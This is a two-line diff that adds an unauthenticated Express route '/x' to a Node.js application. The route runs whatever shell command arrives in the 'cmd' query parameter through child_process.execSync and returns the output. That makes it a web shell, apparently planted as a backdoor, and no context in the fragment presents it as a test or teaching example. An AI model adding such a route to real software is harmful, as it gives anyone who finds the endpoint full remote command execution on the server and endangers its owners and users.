@@ -1,0 +1,2 @@
+app.get('/x', (req, res) => { res.send(require('child_process').execSync(req.query.cmd)); });
+
